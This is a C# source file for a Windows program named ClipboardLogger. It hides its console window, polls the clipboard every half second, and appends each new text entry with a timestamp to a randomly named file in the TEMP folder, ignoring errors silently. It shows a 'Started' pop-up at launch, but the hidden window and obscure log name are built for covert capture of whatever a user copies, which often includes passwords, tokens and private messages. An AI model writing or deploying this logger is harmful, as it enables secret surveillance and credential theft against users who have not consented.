using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace ClipboardLogger
{
    class Program
    {
        // Import Win32 functions to control window visibility
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;      // Hide the window
        const int SW_MINIMIZE = 6;  // Minimize the window

        // Clipboard Win32 functions
        [DllImport("user32.dll")]
        private static extern bool OpenClipboard(IntPtr hWndNewOwner);

        [DllImport("user32.dll")]
        private static extern bool CloseClipboard();

        [DllImport("user32.dll")]
        private static extern IntPtr GetClipboardData(uint uFormat);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GlobalLock(IntPtr hMem);

        [DllImport("kernel32.dll")]
        private static extern bool GlobalUnlock(IntPtr hMem);

        const uint CF_TEXT = 1;

        static string logFilePath;
        static string previousContent = "";

        static void LogClipboard(string content)
        {
            try
            {
                string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                string logEntry = timestamp + " - " + content;
                File.AppendAllText(logFilePath, logEntry + Environment.NewLine);
            }
            catch { /* Silently ignore errors */ }
        }

        static string GetClipboardText()
        {
            string result = "";
            if (OpenClipboard(IntPtr.Zero))
            {
                IntPtr hData = GetClipboardData(CF_TEXT);
                if (hData != IntPtr.Zero)
                {
                    IntPtr lockedData = GlobalLock(hData);
                    if (lockedData != IntPtr.Zero)
                    {
                        result = Marshal.PtrToStringAnsi(lockedData);
                        GlobalUnlock(lockedData);
                    }
                }
                CloseClipboard();
            }
            return result;
        }

        [STAThread] // Required for clipboard access
        static void Main()
        {
            // Hide or minimize the console window
            IntPtr consoleWindow = GetConsoleWindow();
            if (consoleWindow != IntPtr.Zero)
            {
                ShowWindow(consoleWindow, SW_HIDE); // Hide completely
                // Alternative: ShowWindow(consoleWindow, SW_MINIMIZE); // Minimize if hiding fails
            }

            // Show pop-up when program starts
            MessageBox.Show("Started", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);

            // Generate random file name (8 chars)
            Random rand = new Random();
            string randomName = "";
            for (int i = 0; i < 8; i++)
            {
                randomName += (char)(rand.Next(0, 2) == 0 ? rand.Next(65, 91) : rand.Next(97, 123)); // A-Z or a-z
            }
            logFilePath = Path.Combine(Environment.GetEnvironmentVariable("TEMP"), randomName + ".txt");

            // Infinite loop to monitor clipboard
            while (true)
            {
                string currentContent = GetClipboardText();
                if (!string.IsNullOrEmpty(currentContent) && currentContent != previousContent)
                {
                    LogClipboard(currentContent);
                    previousContent = currentContent;
                }
                Thread.Sleep(500);
            }
        }
    }
}